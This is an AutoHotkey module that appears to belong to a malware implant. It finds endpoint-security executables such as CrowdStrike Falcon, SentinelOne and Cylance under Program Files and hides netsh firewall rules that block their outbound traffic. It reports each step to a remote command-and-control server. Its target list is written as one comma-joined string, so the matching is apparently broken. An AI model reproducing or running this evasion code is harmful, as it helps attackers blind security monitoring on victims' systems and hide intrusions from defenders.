; ============================================================================
; DENY OUTBOUND FIREWALL MODULE
; ============================================================================
; Blocks EDR/security tools from making outbound connections
; Requires administrative privileges
; ============================================================================

DenyOutboundFirewall(targets := ["csfalconservice, sentinelone, cylancesvc, SEDservice"]){
    if A_IsAdmin {
        matchingFiles := FindEDRFiles("C:\Program Files")

        if matchingFiles.Length > 0 {

            data := ("Found " matchingFiles.Length " matching files`n")
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)

            ; Create a string combining all file paths
            fileList := ""
            for filePath in matchingFiles {
                fileList .= filePath "`n"  ; Append each file path followed by newline
            }

            ; Combine the count message with the file list
            data .= fileList

            ; Process each found file
            for filePath in matchingFiles {
                ; Extract filename
                SplitPath filePath, &fileName

                ; Create and execute netsh command
                netshCommand := 'netsh advfirewall firewall add rule name="Deny Outbound for ' fileName '" dir=out action=block program="' filePath '" enable=yes'

                try {
                    RunWait netshCommand,, "Hide"
                    data .= "Successfully added firewall rule for: " fileName "`n"
                } catch Error as err {
                    data .= "Error adding firewall rule for " fileName ": " err.Message " at line " err.Line
                }
            }

            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)

        } else {
            data := ("No matching files found in Program Files")
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    } else {
            message := Format("command_output|{}|This module must be run as Admin", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    IsTargetFile(filename) {
        ; Convert filename to lowercase for case-insensitive comparison
        filename := StrLower(filename)

        ; Extract basename (remove extension)
        SplitPath filename,,, , &baseName
        baseName := StrLower(baseName)

        ; Check if basename matches any target
        for target in targets {
            if (baseName = target)
                return true
        }
        return false
    }

    FindEDRFiles(searchPath) {
        matchingFiles := []

        try {
            ; Recursive search through Program Files
            Loop Files, searchPath "\*.exe", "R"  ; R for recursive
            {
                if IsTargetFile(A_LoopFileName) {
                    matchingFiles.Push(A_LoopFileFullPath)
                }
            }
        } catch Error as err {
            ; TODO: Add error handling for agent execution.
        }

        return matchingFiles
    }
}
